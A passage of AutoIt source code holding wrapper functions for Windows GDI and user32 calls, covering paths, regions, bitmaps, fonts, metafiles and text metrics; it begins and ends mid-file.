		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_flattenpath($hdc)
		Local $aret = DllCall("gdi32.dll", "bool", "FlattenPath", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_framergn($hdc, $hrgn, $hbrush, $iwidth, $iheight)
		Local $aret = DllCall("gdi32.dll", "bool", "FrameRgn", "handle", $hdc, "handle", $hrgn, "handle", $hbrush, "int", $iwidth, "int", $iheight)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_gdicomment($hdc, $pbuffer, $isize)
		Local $aret = DllCall("gdi32.dll", "bool", "GdiComment", "handle", $hdc, "uint", $isize, "struct*", $pbuffer)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_getarcdirection($hdc)
		Local $aret = DllCall("gdi32.dll", "int", "GetArcDirection", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		If ($aret[0] < 1) OR ($aret[0] > 2) Then Return SetError(10, $aret[0], 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getbitmapbits($hbitmap, $isize, $pbits)
		Local $aret = DllCall("gdi32.dll", "long", "GetBitmapBits", "handle", $hbitmap, "long", $isize, "struct*", $pbits)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getbitmapdimensionex($hbitmap)
		Local $tsize = DllStructCreate($tagsize)
		Local $aret = DllCall("gdi32.dll", "bool", "GetBitmapDimensionEx", "handle", $hbitmap, "struct*", $tsize)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $tsize
	EndFunc

	Func _winapi_getbkcolor($hdc)
		Local $aret = DllCall("gdi32.dll", "dword", "GetBkColor", "handle", $hdc)
		If @error OR ($aret[0] = -1) Then Return SetError(@error, @extended, -1)
		Return __rgb($aret[0])
	EndFunc

	Func _winapi_getboundsrect($hdc, $iflags = 0)
		Local $trect = DllStructCreate($tagrect)
		Local $aret = DllCall("gdi32.dll", "uint", "GetBoundsRect", "handle", $hdc, "struct*", $trect, "uint", $iflags)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return SetExtended($aret[0], $trect)
	EndFunc

	Func _winapi_getbrushorg($hdc)
		Local $tpoint = DllStructCreate($tagpoint)
		Local $aret = DllCall("gdi32.dll", "bool", "GetBrushOrgEx", "handle", $hdc, "struct*", $tpoint)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $tpoint
	EndFunc

	Func _winapi_getbvalue($irgb)
		Return BitShift(BitAND(__rgb($irgb), 16711680), 16)
	EndFunc

	Func _winapi_getclipbox($hdc, ByRef $trect)
		$trect = DllStructCreate($tagrect)
		Local $aret = DllCall("gdi32.dll", "int", "GetClipBox", "handle", $hdc, "struct*", $trect)
		If @error OR NOT $aret[0] Then
			$trect = 0
			Return SetError(@error, @extended, 0)
		EndIf
		Return $aret[0]
	EndFunc

	Func _winapi_getcliprgn($hdc)
		Local $hrgn = _winapi_createrectrgn(0, 0, 0, 0)
		Local $ierror = 0
		Local $aret = DllCall("gdi32.dll", "int", "GetClipRgn", "handle", $hdc, "handle", $hrgn)
		If @error OR ($aret[0] = -1) Then $ierror = @error + 10
		If $ierror OR NOT $aret[0] Then
			_winapi_deleteobject($hrgn)
			$hrgn = 0
		EndIf
		Return SetError($ierror, 0, $hrgn)
	EndFunc

	Func _winapi_getcoloradjustment($hdc)
		Local $tadjustment = DllStructCreate($tagcoloradjustment)
		Local $aret = DllCall("gdi32.dll", "bool", "GetColorAdjustment", "handle", $hdc, "struct*", $tadjustment)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $tadjustment
	EndFunc

	Func _winapi_getcurrentposition($hdc)
		Local $tpoint = DllStructCreate($tagpoint)
		Local $aret = DllCall("gdi32.dll", "int", "GetCurrentPositionEx", "handle", $hdc, "struct*", $tpoint)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $tpoint
	EndFunc

	Func _winapi_getdevicegammaramp($hdc, ByRef $aramp)
		$aramp = 0
		Local $tdata = DllStructCreate("word[256];word[256];word[256]")
		Local $aret = DllCall("gdi32.dll", "bool", "GetDeviceGammaRamp", "handle", $hdc, "struct*", $tdata)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		Dim $aramp[256][3]
		For $i = 0 To 2
			For $j = 0 To 255
				$aramp[$j][$i] = DllStructGetData($tdata, $i + 1, $j + 1)
			Next
		Next
		Return 1
	EndFunc

	Func _winapi_getdibcolortable($hbitmap)
		Local $hdc = _winapi_createcompatibledc(0)
		Local $hsv = _winapi_selectobject($hdc, $hbitmap)
		Local $tpeak = DllStructCreate("dword[256]")
		Local $ierror = 0
		Local $aret = DllCall("gdi32.dll", "uint", "GetDIBColorTable", "handle", $hdc, "uint", 0, "uint", 256, "struct*", $tpeak)
		If @error OR NOT $aret[0] Then $ierror = @error + 10
		_winapi_selectobject($hdc, $hsv)
		_winapi_deletedc($hdc)
		If $ierror Then Return SetError($ierror, 0, 0)
		Local $tdata = DllStructCreate("dword[" & $aret[0] & "]")
		If @error Then Return SetError(@error + 20, @extended, 0)
		_winapi_movememory($tdata, $aret[4], 4 * $aret[0])
		Return SetExtended($aret[0], $tdata)
	EndFunc

	Func _winapi_getdibits($hdc, $hbitmap, $istartscan, $iscanlines, $pbits, $tbi, $iusage)
		Local $aresult = DllCall("gdi32.dll", "int", "GetDIBits", "handle", $hdc, "handle", $hbitmap, "uint", $istartscan, "uint", $iscanlines, "struct*", $pbits, "struct*", $tbi, "uint", $iusage)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_getenhmetafile($sfilepath)
		Local $aret = DllCall("gdi32.dll", "handle", "GetEnhMetaFileW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getenhmetafilebits($hemf, ByRef $pbuffer)
		Local $aret = DllCall("gdi32.dll", "uint", "GetEnhMetaFileBits", "handle", $hemf, "uint", 0, "ptr", 0)
		If @error OR NOT $aret[0] Then Return SetError(@error + 50, @extended, 0)
		$pbuffer = __heaprealloc($pbuffer, $aret[0], 1)
		If @error Then Return SetError(@error, @extended, 0)
		$aret = DllCall("gdi32.dll", "uint", "GetEnhMetaFileBits", "handle", $hemf, "uint", $aret[0], "ptr", $pbuffer)
		If NOT $aret[0] Then Return SetError(60, 0, 0)
		Return $aret[2]
	EndFunc

	Func _winapi_getenhmetafiledescription($hemf)
		Local $tdata = DllStructCreate("wchar[4096]")
		Local $aret = DllCall("gdi32.dll", "uint", "GetEnhMetaFileDescriptionW", "handle", $hemf, "uint", 4096, "struct*", $tdata)
		If @error OR ($aret[0] = 4294967295) Then Return SetError(@error + 20, $aret[0], 0)
		If NOT $aret[0] Then Return 0
		Local $adata = _winapi_structtoarray($tdata)
		If @error Then Return SetError(@error, @extended, 0)
		Local $aresult[2]
		For $i = 0 To 1
			If $adata[0] > $i Then
				$aresult[$i] = $adata[$i + 1]
			Else
				$aresult[$i] = ""
			EndIf
		Next
		Return $aresult
	EndFunc

	Func _winapi_getenhmetafiledimension($hemf)
		Local $tenhmetaheader = _winapi_getenhmetafileheader($hemf)
		If @error Then Return SetError(@error, @extended, 0)
		Local $tsize = DllStructCreate($tagsize)
		DllStructSetData($tsize, 1, Round((DllStructGetData($tenhmetaheader, "rcFrame", 3) - DllStructGetData($tenhmetaheader, "rcFrame", 1)) * DllStructGetData($tenhmetaheader, "Device", 1) / DllStructGetData($tenhmetaheader, "Millimeters", 1) / 100))
		DllStructSetData($tsize, 2, Round((DllStructGetData($tenhmetaheader, "rcFrame", 4) - DllStructGetData($tenhmetaheader, "rcFrame", 2)) * DllStructGetData($tenhmetaheader, "Device", 2) / DllStructGetData($tenhmetaheader, "Millimeters", 2) / 100))
		Return $tsize
	EndFunc

	Func _winapi_getenhmetafileheader($hemf)
		Local $tenhmetaheader = DllStructCreate($tagenhmetaheader)
		Local $aret = DllCall("gdi32.dll", "uint", "GetEnhMetaFileHeader", "handle", $hemf, "uint", DllStructGetSize($tenhmetaheader), "struct*", $tenhmetaheader)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return SetExtended($aret[0], $tenhmetaheader)
	EndFunc

	Func _winapi_getfontname($sfacename, $istyle = 0, $icharset = 1)
		If NOT $sfacename Then Return SetError(1, 0, "")
		Local $iflags = 0
		If BitAND($istyle, 1) Then
			$iflags += 32
		EndIf
		If BitAND($istyle, 2) Then
			$iflags += 1
		EndIf
		If NOT $iflags Then
			$iflags = 64
		EndIf
		Local $tlogfont = DllStructCreate($taglogfont)
		DllStructSetData($tlogfont, 9, $icharset)
		DllStructSetData($tlogfont, 13, 0)
		DllStructSetData($tlogfont, 14, StringLeft($sfacename, 31))
		Local $tfn = DllStructCreate("dword;wchar[64]")
		DllStructSetData($tfn, 1, $iflags)
		DllStructSetData($tfn, 2, "")
		Local $hdc = _winapi_createcompatibledc(0)
		Local $henumproc = DllCallbackRegister("__EnumFontStylesProc", "int", "ptr;ptr;dword;lparam")
		Local $sret = ""
		Local $aret = DllCall("gdi32.dll", "int", "EnumFontFamiliesExW", "handle", $hdc, "struct*", $tlogfont, "ptr", DllCallbackGetPtr($henumproc), "struct*", $tfn, "dword", 0)
		If NOT @error AND NOT $aret[0] Then $sret = DllStructGetData($tfn, 2)
		DllCallbackFree($henumproc)
		_winapi_deletedc($hdc)
		If NOT $sret Then Return SetError(2, 0, "")
		Return $sret
	EndFunc

	Func _winapi_getfontresourceinfo($sfont, $bforce = False, $iflag = Default)
		If $iflag = Default Then
			If $bforce Then
				If NOT _winapi_addfontresourceex($sfont, $fr_not_enum) Then Return SetError(@error + 20, @extended, "")
			EndIf
			Local $ierror = 0
			Local $aret = DllCall("gdi32.dll", "bool", "GetFontResourceInfoW", "wstr", $sfont, "dword*", 4096, "wstr", "", "dword", 1)
			If @error OR NOT $aret[0] Then $ierror = @error + 10
			If $bforce Then
				_winapi_removefontresourceex($sfont, $fr_not_enum)
			EndIf
			If $ierror Then Return SetError($ierror, 0, "")
			Return $aret[3]
		Else
			If NOT FileExists($sfont) Then
				$sfont = RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "Fonts") & "\" & $sfont
				If NOT FileExists($sfont) Then Return SetError(31, 0, "")
			EndIf
			Local Const $hfile = _winapi_createfile($sfont, 2, 2, 2)
			If NOT $hfile Then Return SetError(32, _winapi_getlasterror(), "")
			Local Const $ifile = FileGetSize($sfont)
			Local Const $tbuffer = DllStructCreate("byte[" & $ifile + 1 & "]")
			Local Const $pfile = DllStructGetPtr($tbuffer)
			Local $iread
			_winapi_readfile($hfile, $pfile, $ifile, $iread)
			_winapi_closehandle($hfile)
			Local $sttfname = _winapi_getfontmemoryresourceinfo($pfile, $iflag)
			If @error Then
				If @error = 1 AND $iflag = 4 Then
					$sttfname = _winapi_getfontresourceinfo($sfont, True)
					Return SetError(@error, @extended, $sttfname)
				EndIf
				Return SetError(33, @error, "")
			EndIf
			Return $sttfname
		EndIf
	EndFunc

	Func _winapi_getfontmemoryresourceinfo($pmemory, $iflag = 1)
		Local Const $tagtt_offset_table = "USHORT uMajorVersion;USHORT uMinorVersion;USHORT uNumOfTables;USHORT uSearchRange;USHORT uEntrySelector;USHORT uRangeShift"
		Local Const $tagtt_table_directory = "char szTag[4];ULONG uCheckSum;ULONG uOffset;ULONG uLength"
		Local Const $tagtt_name_table_header = "USHORT uFSelector;USHORT uNRCount;USHORT uStorageOffset"
		Local Const $tagtt_name_record = "USHORT uPlatformID;USHORT uEncodingID;USHORT uLanguageID;USHORT uNameID;USHORT uStringLength;USHORT uStringOffset"
		Local $tttoffsettable = DllStructCreate($tagtt_offset_table, $pmemory)
		Local $inumoftables = _winapi_swapword(DllStructGetData($tttoffsettable, "uNumOfTables"))
		If NOT (_winapi_swapword(DllStructGetData($tttoffsettable, "uMajorVersion")) = 1 AND _winapi_swapword(DllStructGetData($tttoffsettable, "uMinorVersion")) = 0) Then Return SetError(1, 0, "")
		Local $itbldirsize = DllStructGetSize(DllStructCreate($tagtt_table_directory))
		Local $bfound = False, $ioffset, $ttbldir
		For $i = 0 To $inumoftables - 1
			$ttbldir = DllStructCreate($tagtt_table_directory, $pmemory + DllStructGetSize($tttoffsettable) + $i * $itbldirsize)
			If StringLeft(DllStructGetData($ttbldir, "szTag"), 4) = "name" Then
				$bfound = True
				$ioffset = _winapi_swapdword(DllStructGetData($ttbldir, "uOffset"))
				ExitLoop
			EndIf
		Next
		If NOT $bfound Then Return SetError(2, 0, "")
		Local $tntheader = DllStructCreate($tagtt_name_table_header, $pmemory + $ioffset)
		Local $intheadersize = DllStructGetSize($tntheader)
		Local $inrcount = _winapi_swapword(DllStructGetData($tntheader, "uNRCount"))
		Local $istorageoffset = _winapi_swapword(DllStructGetData($tntheader, "uStorageOffset"))
		Local $ittrecordsize = DllStructGetSize(DllStructCreate($tagtt_name_record))
		Local $tresult, $sresult, $istringlength, $istringoffset, $iencodingid, $tttrecord
		For $i = 0 To $inrcount - 1
			$tttrecord = DllStructCreate($tagtt_name_record, $pmemory + $ioffset + $intheadersize + $i * $ittrecordsize)
			If _winapi_swapword($tttrecord.unameid) = $iflag Then
				$istringlength = _winapi_swapword(DllStructGetData($tttrecord, "uStringLength"))
				$istringoffset = _winapi_swapword(DllStructGetData($tttrecord, "uStringOffset"))
				$iencodingid = _winapi_swapword(DllStructGetData($tttrecord, "uEncodingID"))
				Local $swchar = "char"
				If $iencodingid = 1 Then
					$swchar = "word"
					$istringlength = $istringlength / 2
				EndIf
				$tresult = DllStructCreate($swchar & " szTTFName[" & $istringlength & "]", $pmemory + $ioffset + $istringoffset + $istorageoffset)
				If $iencodingid = 1 Then
					$sresult = ""
					For $j = 1 To $istringlength
						$sresult &= ChrW(_winapi_swapword(DllStructGetData($tresult, 1, $j)))
					Next
				Else
					$sresult = $tresult.szttfname
				EndIf
				If StringLen($sresult) > 0 Then ExitLoop
			EndIf
		Next
		Return $sresult
	EndFunc

	Func _winapi_getglyphoutline($hdc, $schar, $iformat, ByRef $pbuffer, $tmat2 = 0)
		Local $tgm = DllStructCreate($tagglyphmetrics)
		Local $aret, $ilength = 0
		If NOT IsDllStruct($tmat2) Then
			$tmat2 = DllStructCreate("short[8]")
			DllStructSetData($tmat2, 1, 1, 2)
			DllStructSetData($tmat2, 1, 1, 8)
		EndIf
		If $iformat Then
			$aret = DllCall("gdi32.dll", "dword", "GetGlyphOutlineW", "handle", $hdc, "uint", AscW($schar), "uint", $iformat, "struct*", $tgm, "dword", 0, "ptr", 0, "struct*", $tmat2)
			If @error OR ($aret[0] = 4294967295) Then Return SetError(@error + 10, @extended, 0)
			$ilength = $aret[0]
			$pbuffer = __heaprealloc($pbuffer, $ilength, 1)
			If @error Then Return SetError(@error + 20, @extended, 0)
		EndIf
		$aret = DllCall("gdi32.dll", "dword", "GetGlyphOutlineW", "handle", $hdc, "uint", AscW($schar), "uint", $iformat, "struct*", $tgm, "dword", $ilength, "ptr", $pbuffer, "struct*", $tmat2)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] = 4294967295 Then Return SetError(10, -1, 0)
		Return SetExtended($ilength, $tgm)
	EndFunc

	Func _winapi_getgraphicsmode($hdc)
		Local $aret = DllCall("gdi32.dll", "int", "GetGraphicsMode", "handle", $hdc)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getgvalue($irgb)
		Return BitShift(BitAND(__rgb($irgb), 65280), 8)
	EndFunc

	Func _winapi_getmapmode($hdc)
		Local $aret = DllCall("gdi32.dll", "int", "GetMapMode", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getmonitorinfo($hmonitor)
		Local $tmiex = DllStructCreate("dword;long[4];long[4];dword;wchar[32]")
		DllStructSetData($tmiex, 1, DllStructGetSize($tmiex))
		Local $aret = DllCall("user32.dll", "bool", "GetMonitorInfoW", "handle", $hmonitor, "struct*", $tmiex)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $aresult[4]
		For $i = 0 To 1
			$aresult[$i] = DllStructCreate($tagrect)
			_winapi_movememory($aresult[$i], DllStructGetPtr($tmiex, $i + 2), 16)
		Next
		$aresult[3] = DllStructGetData($tmiex, 5)
		Switch DllStructGetData($tmiex, 4)
			Case 1
				$aresult[2] = 1
			Case Else
				$aresult[2] = 0
		EndSwitch
		Return $aresult
	EndFunc

	Func _winapi_getoutlinetextmetrics($hdc)
		Local $aret = DllCall("gdi32.dll", "uint", "GetOutlineTextMetricsW", "handle", $hdc, "uint", 0, "ptr", 0)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $tdata = DllStructCreate("byte[" & $aret[0] & "]")
		Local $toltm = DllStructCreate($tagoutlinetextmetric, DllStructGetPtr($tdata))
		$aret = DllCall("gdi32.dll", "uint", "GetOutlineTextMetricsW", "handle", $hdc, "uint", $aret[0], "struct*", $tdata)
		If NOT $aret[0] Then Return SetError(20, 0, 0)
		Return $toltm
	EndFunc

	Func _winapi_getpixel($hdc, $ix, $iy)
		Local $aret = DllCall("gdi32.dll", "dword", "GetPixel", "handle", $hdc, "int", $ix, "int", $iy)
		If @error OR ($aret[0] = 4294967295) Then Return SetError(@error, @extended, -1)
		Return __rgb($aret[0])
	EndFunc

	Func _winapi_getpolyfillmode($hdc)
		Local $aret = DllCall("gdi32.dll", "int", "GetPolyFillMode", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getposfromrect($trect)
		Local $aresult[4]
		For $i = 0 To 3
			$aresult[$i] = DllStructGetData($trect, $i + 1)
			If @error Then Return SetError(@error, @extended, 0)
		Next
		For $i = 2 To 3
			$aresult[$i] -= $aresult[$i - 2]
		Next
		Return $aresult
	EndFunc

	Func _winapi_getregiondata($hrgn, ByRef $trgndata)
		Local $aret = DllCall("gdi32.dll", "dword", "GetRegionData", "handle", $hrgn, "dword", 0, "ptr", 0)
		If @error OR NOT $aret[0] Then
			$trgndata = 0
			Return SetError(@error, @extended, False)
		EndIf
		$trgndata = DllStructCreate($tagrgndataheader)
		Local $irectsize = $aret[0] - DllStructGetSize($trgndata)
		If $irectsize > 0 Then $trgndata = DllStructCreate($tagrgndataheader & ";byte[" & $irectsize & "]")
		$aret = DllCall("gdi32.dll", "dword", "GetRegionData", "handle", $hrgn, "dword", $aret[0], "struct*", $trgndata)
		If NOT $aret[0] Then $trgndata = 0
		Return $aret[0]
	EndFunc

	Func _winapi_getrgnbox($hrgn, ByRef $trect)
		$trect = DllStructCreate($tagrect)
		Local $aret = DllCall("gdi32.dll", "int", "GetRgnBox", "handle", $hrgn, "struct*", $trect)
		If @error OR NOT $aret[0] Then
			$trect = 0
			Return SetError(@error, @extended, 0)
		EndIf
		Return $aret[0]
	EndFunc

	Func _winapi_getrop2($hdc)
		Local $aret = DllCall("gdi32.dll", "int", "GetROP2", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getrvalue($irgb)
		Return BitAND(__rgb($irgb), 255)
	EndFunc

	Func _winapi_getstretchbltmode($hdc)
		Local $aret = DllCall("gdi32.dll", "int", "GetStretchBltMode", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_gettabbedtextextent($hdc, $stext, $atab = 0, $istart = 0, $iend = -1)
		Local $itab, $icount
		If NOT IsArray($atab) Then
			If $atab Then
				$itab = $atab
				Dim $atab[1] = [$itab]
				$istart = 0
				$iend = 0
				$icount = 1
			Else
				$icount = 0
			EndIf
		Else
			$icount = 1
		EndIf
		Local $ttab = 0
		If $icount Then
			If __checkerrorarraybounds($atab, $istart, $iend) Then Return SetError(@error + 10, @extended, 0)
			$icount = $iend - $istart + 1
			$ttab = DllStructCreate("uint[" & $icount & "]")
			$itab = 1
			For $i = $istart To $iend
				DllStructSetData($ttab, 1, $atab[$i], $itab)
				$itab += 1
			Next
		EndIf
		Local $aret = DllCall("user32.dll", "dword", "GetTabbedTextExtentW", "handle", $hdc, "wstr", $stext, "int", StringLen($stext), "int", $icount, "struct*", $ttab)
		If @error OR NOT $aret[0] Then Return SetError(@error + 20, @extended, 0)
		Return _winapi_createsize(_winapi_loword($aret[0]), _winapi_hiword($aret[0]))
	EndFunc

	Func _winapi_gettextalign($hdc)
		Local $aret = DllCall("gdi32.dll", "uint", "GetTextAlign", "handle", $hdc)
		If @error OR ($aret[0] = 4294967295) Then Return SetError(@error, @extended, -1)
		Return $aret[0]
	EndFunc

	Func _winapi_gettextcharacterextra($hdc)
		Local $aret = DllCall("gdi32.dll", "int", "GetTextCharacterExtra", "handle", $hdc)
		If @error OR ($aret[0] = 134217728) Then Return SetError(@error, @extended, -1)
		Return $aret[0]
	EndFunc

	Func _winapi_gettextface($hdc)
		Local $aret = DllCall("gdi32.dll", "int", "GetTextFaceW", "handle", $hdc, "int", 2048, "wstr", "")
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[3]
	EndFunc

	Func _winapi_getudfcolormode()
		Return Number($__g_irgbmode)
	EndFunc

	Func _winapi_getupdaterect($hwnd, $berase = True)
		Local $trect = DllStructCreate($tagrect)
		Local $aret = DllCall("user32.dll", "bool", "GetUpdateRect", "hwnd", $hwnd, "struct*", $trect, "bool", $berase)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $trect
	EndFunc

	Func _winapi_getupdatergn($hwnd, $hrgn, $berase = True)
		Local $aret = DllCall("user32.dll", "int", "GetUpdateRgn", "hwnd", $hwnd, "handle", $hrgn, "bool", $berase)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getwindowext($hdc)
		Local $tsize = DllStructCreate($tagsize)
		Local $aret = DllCall("gdi32.dll", "bool", "GetWindowExtEx", "handle", $hdc, "struct*", $tsize)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $tsize
	EndFunc

	Func _winapi_getwindoworg($hdc)
		Local $tpoint = DllStructCreate($tagpoint)
		Local $aret = DllCall("gdi32.dll", "bool", "GetWindowOrgEx", "handle", $hdc, "struct*", $tpoint)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $tpoint
	EndFunc

	Func _winapi_getwindowrgnbox($hwnd, ByRef $trect)
		$trect = DllStructCreate($tagrect)
		Local $aret = DllCall("gdi32.dll", "int", "GetWindowRgnBox", "hwnd", $hwnd, "struct*", $trect)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getworldtransform($hdc)
		Local $txform = DllStructCreate($tagxform)
		Local $aret = DllCall("gdi32.dll", "bool", "GetWorldTransform", "handle", $hdc, "struct*", $txform)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $txform
	EndFunc

	Func _winapi_gradientfill($hdc, Const ByRef $avertex, $istart = 0, $iend = -1, $brotate = False)
		If __checkerrorarraybounds($avertex, $istart, $iend, 2) Then Return SetError(@error + 10, @extended, 0)
		If UBound($avertex, $ubound_columns) < 3 Then Return SetError(13, 0, 0)
		Local $ipoint = $iend - $istart + 1
		If $ipoint > 3 Then
			$iend = $istart + 2
			$ipoint = 3
		EndIf
		Local $imode
		Switch $ipoint
			Case 2
				$imode = Number(NOT $brotate)
			Case 3
				$imode = 2
			Case Else
				Return SetError(15, 0, 0)
		EndSwitch
		Local $tagstruct = ""
		For $i = $istart To $iend
			$tagstruct &= "ushort[8];"
		Next
		Local $tvertex = DllStructCreate($tagstruct)
		Local $icount = 1
		Local $tgradient = DllStructCreate("ulong[" & $ipoint & "]")
		For $i = $istart To $iend
			DllStructSetData($tgradient, 1, $icount - 1, $icount)
			DllStructSetData($tvertex, $icount, _winapi_loword($avertex[$i][0]), 1)
			DllStructSetData($tvertex, $icount, _winapi_hiword($avertex[$i][0]), 2)
			DllStructSetData($tvertex, $icount, _winapi_loword($avertex[$i][1]), 3)
			DllStructSetData($tvertex, $icount, _winapi_hiword($avertex[$i][1]), 4)
			DllStructSetData($tvertex, $icount, BitShift(_winapi_getrvalue($avertex[$i][2]), -8), 5)
			DllStructSetData($tvertex, $icount, BitShift(_winapi_getgvalue($avertex[$i][2]), -8), 6)
			DllStructSetData($tvertex, $icount, BitShift(_winapi_getbvalue($avertex[$i][2]), -8), 7)
			DllStructSetData($tvertex, $icount, 0, 8)
			$icount += 1
		Next
		Local $aret = DllCall("gdi32.dll", "bool", "GdiGradientFill", "handle", $hdc, "struct*", $tvertex, "ulong", $ipoint, "struct*", $tgradient, "ulong", 1, "ulong", $imode)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_inflaterect(ByRef $trect, $idx, $idy)
		Local $aret = DllCall("user32.dll", "bool", "InflateRect", "struct*", $trect, "int", $idx, "int", $idy)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_intersectcliprect($hdc, $trect)
		Local $aret = DllCall("gdi32.dll", "int", "IntersectClipRect", "handle", $hdc, "int", DllStructGetData($trect, 1), "int", DllStructGetData($trect, 2), "int", DllStructGetData($trect, 3), "int", DllStructGetData($trect, 4))
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_intersectrect($trect1, $trect2)
		Local $trect = DllStructCreate($tagrect)
		Local $aret = DllCall("user32.dll", "bool", "IntersectRect", "struct*", $trect, "struct*", $trect1, "struct*", $trect2)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $trect
	EndFunc

	Func _winapi_invalidatergn($hwnd, $hrgn = 0, $berase = True)
		Local $aret = DllCall("user32.dll", "bool", "InvalidateRgn", "hwnd", $hwnd, "handle", $hrgn, "bool", $berase)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_invertandbitmap($hbitmap, $bdelete = False)
		Local $tbitmap = DllStructCreate($tagbitmap)
		If NOT _winapi_getobject($hbitmap, DllStructGetSize($tbitmap), $tbitmap) OR (DllStructGetData($tbitmap, "bmBitsPixel") <> 1) Then
			Return SetError(@error + 10, @extended, 0)
		EndIf
		Local $hresult = _winapi_createdib(DllStructGetData($tbitmap, "bmWidth"), DllStructGetData($tbitmap, "bmHeight"), 1)
		If NOT $hresult Then Return SetError(@error, @extended, 0)
		Local $hsrcdc = _winapi_createcompatibledc(0)
		Local $hsrcsv = _winapi_selectobject($hsrcdc, $hbitmap)
		Local $hdstdc = _winapi_createcompatibledc(0)
		Local $hdstsv = _winapi_selectobject($hdstdc, $hresult)
		_winapi_bitblt($hdstdc, 0, 0, DllStructGetData($tbitmap, "bmWidth"), DllStructGetData($tbitmap, "bmHeight"), $hsrcdc, 0, 0, 3342344)
		_winapi_selectobject($hsrcdc, $hsrcsv)
		_winapi_deletedc($hsrcdc)
		_winapi_selectobject($hdstdc, $hdstsv)
		_winapi_deletedc($hdstdc)
		If $bdelete Then
			_winapi_deleteobject($hbitmap)
		EndIf
		Return $hresult
	EndFunc

	Func _winapi_invertcolor($icolor)
		If $icolor = -1 Then Return 0
		Return 16777215 - BitAND($icolor, 16777215)
	EndFunc

	Func _winapi_invertrect($hdc, ByRef $trect)
		Local $aret = DllCall("user32.dll", "bool", "InvertRect", "handle", $hdc, "struct*", $trect)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_invertrgn($hdc, $hrgn)
		Local $aret = DllCall("gdi32.dll", "bool", "InvertRgn", "handle", $hdc, "handle", $hrgn)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_isrectempty(ByRef $trect)
		Local $aret = DllCall("user32.dll", "bool", "IsRectEmpty", "struct*", $trect)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_linedda($ix1, $iy1, $ix2, $iy2, $plineproc, $pdata = 0)
		Local $aret = DllCall("gdi32.dll", "bool", "LineDDA", "int", $ix1, "int", $iy1, "int", $ix2, "int", $iy2, "ptr", $plineproc, "lparam", $pdata)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_lineto($hdc, $ix, $iy)
		Local $aresult = DllCall("gdi32.dll", "bool", "LineTo", "handle", $hdc, "int", $ix, "int", $iy)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_lockwindowupdate($hwnd)
		Local $aret = DllCall("user32.dll", "bool", "LockWindowUpdate", "hwnd", $hwnd)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_lptodp($hdc, ByRef $tpoint, $icount = 1)
		Local $aret = DllCall("gdi32.dll", "bool", "LPtoDP", "handle", $hdc, "struct*", $tpoint, "int", $icount)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_maskblt($hdestdc, $ixdest, $iydest, $iwidth, $iheight, $hsrcdc, $ixsrc, $iysrc, $hmask, $ixmask, $iymask, $irop)
